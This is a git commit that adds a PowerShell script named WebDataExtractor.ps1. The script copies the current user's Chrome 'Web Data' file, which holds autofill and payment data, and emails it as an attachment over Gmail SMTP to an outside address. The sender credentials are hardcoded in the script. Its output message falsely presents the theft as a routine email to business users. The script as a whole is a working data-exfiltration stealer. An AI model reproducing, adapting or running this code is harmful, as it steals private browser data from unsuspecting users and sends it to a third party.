ccd504853dfb81ef5a092ce8e1977cca77fc799d
Savitar407 <42724977+Savitar407@users.noreply.github.com>
2021-05-22 18:12:47 -0400

    Add files via upload

---
+++ WebDataExtractor.ps1
@@ -0,0 +1,13 @@
+﻿cd "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default"
+copy "Web Data" WebData
+$Body = "Sample Email Body"  
+$SmtpServer = 'smtp.gmail.com'  
+$SmtpUser = 'rogermoor283@gmail.com'  
+$smtpPassword = '822247581'  
+$MailtTo = 'joelhutchinson407@gmail.com'  
+$MailFrom = 'rogermoor283@gmail.com'  
+$MailSubject = "Testing Mail Attachments using $SmtpServer"  
+$Credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $SmtpUser, $($smtpPassword |  
+ConvertTo-SecureString -AsPlainText -Force)  
+Send-MailMessage -To "$MailtTo" -from "$MailFrom" -Subject $MailSubject -Body "$Body" -Attachments "C:\Users\$env:UserName\AppData\Local\Google\Chrome\User Data\Default\WebData" -SmtpServer $SmtpServer -BodyAsHtml -UseSsl -Credential $Credentials  
+write-Output "Custom Message : Attachment Email Sent to Business Users"
